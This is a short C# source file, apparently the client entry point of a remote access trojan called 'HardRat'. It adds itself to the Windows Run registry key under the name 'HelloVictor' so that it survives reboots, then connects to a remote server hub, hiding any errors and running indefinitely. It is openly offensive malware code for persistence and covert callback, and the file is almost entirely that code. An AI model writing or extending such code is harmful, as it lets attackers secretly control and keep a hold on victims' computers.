using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;

namespace HardRat.ClientApp
{
    class Program
    {
        static void Main(string[] args)
        {
            SetStartup();
            var connection = new ServerHubConnection();
            try
            {
                connection.StartAsync()?.GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {

            }
            Task.Delay(-1).GetAwaiter().GetResult();
        }

        private static void SetStartup()
        {
            const string AppName = "HelloVictor";

            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            var loc = Path.Combine(Directory.GetCurrentDirectory(), "HardRat.ClientApp.exe");


            Console.WriteLine(loc);
            rk.DeleteValue(AppName);
            rk.SetValue(AppName, loc);

        }
    }
}
